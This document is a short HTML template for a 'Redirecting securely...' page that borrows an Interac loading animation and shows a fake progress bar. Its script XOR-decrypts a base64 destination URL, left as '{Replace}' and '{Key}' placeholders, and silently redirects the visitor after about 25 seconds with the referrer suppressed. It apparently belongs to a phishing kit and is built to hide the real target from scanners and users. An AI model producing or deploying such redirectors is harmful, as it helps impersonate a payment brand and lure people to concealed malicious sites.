<!DOCTYPE html>
<html>
<head>
  <meta name="referrer" content="no-referrer" />
  <title>Redirecting...</title>
  <style>
    body {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #f9f9f9;
    }
    img {
      max-width: 50%;
      height: auto;
    }
    .progress {
      margin-top: 20px;
      width: 80%;
      max-width: 400px;
      height: 20px;
      background-color: #e0e0e0;
      border-radius: 10px;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      width: 0;
      background-color: #76c7c0;
      transition: width 0.1s;
    }
    .percentage {
      margin-top: 10px;
      font-size: 16px;
    }
  </style>
</head>
<body>
  <img src="https://www.interac.ca/wp-content/uploads/2021/05/TrueFalse_GIF_05-4.gif" alt="Loading">
  <h4>Redirecting securely...</h4>
  <div class="progress">
    <div class="progress-bar" id="progress-bar"></div>
  </div>
  <div class="percentage" id="percentage">0%</div>
  <script type="text/javascript">
    const progressBar = document.getElementById('progress-bar');
    const percentage = document.getElementById('percentage');
    let progress = 0;

    function decryptURL(encrypted, key) {
      return atob(encrypted)
        .split('')
        .map((char, i) => String.fromCharCode(char.charCodeAt(0) ^ key.charCodeAt(i % key.length)))
        .join('');
    }

    const encryptedLink = "{Replace}";
    const key = "{Key}";
    const decryptedURL = decryptURL(encryptedLink, key);

    const interval = setInterval(() => {
      progress += 10;
      progressBar.style.width = progress + '%';
      percentage.textContent = progress + '%';

      if (progress >= 100) {
        clearInterval(interval);
        window.location.replace(decryptedURL);
      }
    }, 2500);
  </script>
</body>
</html>
